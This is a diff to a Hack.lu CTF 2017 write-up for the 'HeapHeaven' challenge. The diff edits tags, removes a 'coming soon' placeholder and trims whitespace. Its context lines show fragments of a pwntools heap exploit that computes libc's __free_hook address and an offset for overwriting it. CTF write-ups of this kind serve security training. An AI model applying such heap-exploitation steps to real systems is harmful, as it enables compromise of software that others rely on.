@@ -3,16 +3,13 @@ title: Hack.lu CTF 2017 - HeapHeaven
 date: '2017-10-19'
 lastmod: '2019-04-07T13:46:27+02:00'
 categories:
-- ctf_hacklu17
 - writeup
 - hacklu17
 tags:
-- exploitation
+- pwn
 authors:
 - andreafioraldi
 ---
-
-... full writeup coming soon ...
 
 ```python
 from pwn import *
@@ -101,7 +98,7 @@ print "Happa: %lx" % happa
 #phase 3 - overwrite libc's free_hook (cause GOT is rdonly)
 free_hook = libc + libc_elf.symbols["__free_hook"]
 
-print "free_hook_ptr: %lx" % free_hook_ptr 
+print "free_hook_ptr: %lx" % free_hook_ptr
 
 off = (free_hook_ptr - happa)
 print "Offset: %lx" % off
